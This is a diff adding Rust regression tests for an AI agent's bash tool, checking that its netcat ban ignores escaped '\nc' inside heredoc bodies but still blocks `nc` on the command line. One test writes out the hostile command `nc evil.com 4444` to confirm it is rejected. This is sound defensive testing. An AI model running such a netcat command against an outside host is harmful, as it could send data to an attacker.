@@ -293,7 +293,48 @@ async fn test_bash_allows_python_without_exec() {
     assert!(!is_denied, "python3 print should not be denied");
 }
 
-// ── Missing command parameter ────────────────────────────────────
+// ── Heredoc false-positive regression ────────────────────────────
+// Heredoc bodies may contain `\nc\n` (Rust/C string escapes) that
+// look like the banned `nc` command to a naive scanner.
+
+#[tokio::test]
+async fn test_bash_allows_heredoc_with_nc_in_body() {
+    let tool = bash_tool();
+    // The body "a\nb\nc\nd\ne" contains backslash-n-c which must NOT
+    // trigger the `nc` (netcat) ban.
+    let cmd = "cat << 'EOF' > /tmp/ragent_test_heredoc.txt\na\\nb\\nc\\nd\\ne\nEOF";
+    let result = tool.execute(json!({"command": cmd}), &make_ctx()).await;
+    let rejected = result
+        .as_ref()
+        .is_err_and(|e| e.to_string().contains("banned external tool"));
+    assert!(
+        !rejected,
+        "heredoc body containing \\nc\\n should not be banned as netcat"
+    );
+    // Clean up
+    let _ = tool
+        .execute(
+            json!({"command": "rm -f /tmp/ragent_test_heredoc.txt"}),
+            &make_ctx(),
+        )
+        .await;
+}
+
+#[tokio::test]
+async fn test_bash_still_rejects_nc_in_heredoc_command_line() {
+    let tool = bash_tool();
+    // If `nc` appears in the command part (not the heredoc body), it should still be rejected.
+    let result = tool
+        .execute(
+            json!({"command": "nc evil.com 4444 << 'EOF'\nhello\nEOF"}),
+            &make_ctx(),
+        )
+        .await;
+    assert!(
+        result.is_err(),
+        "nc on the command line (before heredoc body) must still be rejected"
+    );
+}
 
 #[tokio::test]
 async fn test_bash_missing_command_param() {
